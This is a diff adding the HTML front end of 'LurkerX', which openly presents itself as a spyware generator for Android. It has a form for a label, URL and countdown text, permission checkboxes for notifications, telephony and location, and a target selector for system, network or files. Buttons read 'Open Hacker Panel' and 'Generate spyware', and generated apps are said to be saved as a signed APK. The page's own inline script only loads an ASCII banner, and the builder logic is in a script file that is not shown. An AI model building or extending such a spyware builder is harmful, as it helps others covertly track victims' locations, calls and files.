@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>LurkerX</title>
+    <link rel="stylesheet" href="../../internal/fontawesome-7.1.0/css/all.min.css">
+
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div id="overlayLoader" class="loader hidden">
+        <div class="spinner"></div>
+        <div class="loader-text">Loading configuration…</div>
+    </div>
+
+
+    <div class="section" id="doomSection">
+        <pre id="doomText"
+            style="color: yellow; background-color: black; padding: 10px; border-radius: 5px; font-family: monospace;">
+        Loading…
+    </pre>
+    </div>
+
+    <script>
+        async function loadDoom() {
+            try {
+                const response = await fetch('doom.txt');
+                if (!response.ok) throw new Error(`HTTP ${response.status}`);
+                const text = await response.text();
+                const doomEl = document.getElementById('doomText');
+                doomEl.textContent = text; // preserves figlet/ASCII formatting
+            } catch (err) {
+                document.getElementById('doomText').textContent = "Failed to load doom.txt: " + err;
+            }
+        }
+
+        document.addEventListener("DOMContentLoaded", loadDoom);
+    </script>
+
+    <div class="section">
+        <h3>General Details</h3>
+        <label>Label:
+            <input type="text" id="username" placeholder="Enter label">
+        </label>
+        <label>URL:
+            <input type="text" id="url" placeholder="Enter URL">
+        </label>
+        <label>Countdown text:
+            <textarea id="countdowntext" placeholder="Default text to show in countdown"></textarea>
+        </label>
+    </div>
+
+    <div class="section">
+        <h3>Visibility</h3>
+        <label><input type="radio" name="visibility" value="true"> Auto hide</label>
+        <label><input type="radio" name="visibility" value="false"> Don't hide</label>
+    </div>
+
+    <div class="section">
+        <h3>Permissions</h3>
+        <label><input type="checkbox" id="opt1" checked> Notifications</label>
+        <label><input type="checkbox" id="opt2" checked> Telephony</label>
+        <label><input type="checkbox" id="opt3" checked> Location</label>
+    </div>
+
+    <div class="section">
+        <h3>Target</h3>
+        <select id="targetSelect">
+            <option value="system">System</option>
+            <option value="network">Network</option>
+            <option value="files">Files</option>
+        </select>
+    </div>
+
+    <button id="openPanelBtn" class="button"><i class="fas fa-chart-pie"></i> Open Hacker Panel</button>
+    <button id="generateBtn" class="button"><i class="fas fa-gears"></i> Generate spyware</button>
+    <button id="downloadJBtn" class="button"><i class="fab fa-java"></i> Install JAVA</button>
+    <button id="downloadBtn" class="button"><i class="fas fa-rocket"></i> View generated app</button>
+    <p>Generated spyware would be saved as "final_signed.apk"</p>
+    <p id="status"></p>
+    <script src="script.js"></script>
+</body>
+
+</html>
